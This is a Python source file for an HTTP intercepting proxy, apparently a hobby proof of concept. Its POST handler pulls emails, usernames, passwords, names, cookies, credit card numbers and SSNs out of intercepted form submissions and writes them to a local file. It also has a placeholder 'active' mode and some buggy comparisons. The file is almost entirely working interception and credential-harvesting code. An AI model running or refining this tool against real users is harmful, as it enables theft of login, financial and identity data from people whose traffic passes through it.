import argparse
import socketserver
import http.server
import http.client
import re

class myProxy(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # url = self.path[1:]
        if self.path[:8] == "/http://":
            url = self.path[8:] # idea: remove /http://
        else:
            url = self.path[1:] # frickin only for favicon.ico (i hate you cisco)
            if url == "favicon.ico":
                return # just in case & was needed :sadge:
        print("url:", url)
        connection = http.client.HTTPConnection(url)
        # prob unnecessary but remnants of trying to get favicon to have a normal error
        connection.request("HEAD", "/")
        response = connection.getresponse()
        # print(response.read(2048))
        # self.send_response(200)
        status = response.status  
        # print("status(?):", status)
        self.send_response(status)
        self.end_headers()
        # again, remnants of trying to get favicon to have a normal error
        connection.request("GET", "/")
        response = connection.getresponse()
        return self.copyfile(response, self.wfile)
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_data_str = post_data.decode("UTF-8")
        list_of_post_data = post_data_str.split('&')
        
        try:
            f = open("info1.txt", "w")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

        post_data_dict = {}
        for item in list_of_post_data:
            variable, value = item.split('=')
            result = re.findall(r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$", value) # email input probably
            if result:
                f.write(f"email: {result}")
            else: # proof of concept
                if variable.lower() == "username":
                    f.write(f"username: {value}")
                elif variable.lower() == "password":
                    f.write(f"password: {value}")
                elif variable.lower() == "name":
                    f.write(f"name: {value}")
                elif variable.lower() == "cookies":
                    f.write(f"cookies: {value}")
                elif variable.lower == "creditcard":
                    f.write(f"creditcard: {value}")
                elif variable.lower == "ssn":
                    f.write(f"SSN: {value}")
            post_data_dict[variable] = value

        return http.server.SimpleHTTPRequestHandler.do_GET(self)

    


if __name__ == "__main__":
    # handling args
    parser = argparse.ArgumentParser()
    parser.add_argument('-m', default="passive", dest="mode")
    parser.add_argument("listening_ip")
    parser.add_argument("listening_port")
    args = parser.parse_args()

    # print(args)
    if args.mode == "passive":
            # setting up basic proxy
        httpd = socketserver.ForkingTCPServer((args.listening_ip, int(args.listening_port)), myProxy)
        print (f"Now serving at {args.listening_ip}:{args.listening_port}")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()
            exit(0)
    elif args.mode == "active":
        pass
    else:
        print("illegal mode: choose between [active/passive]")
        exit(0)


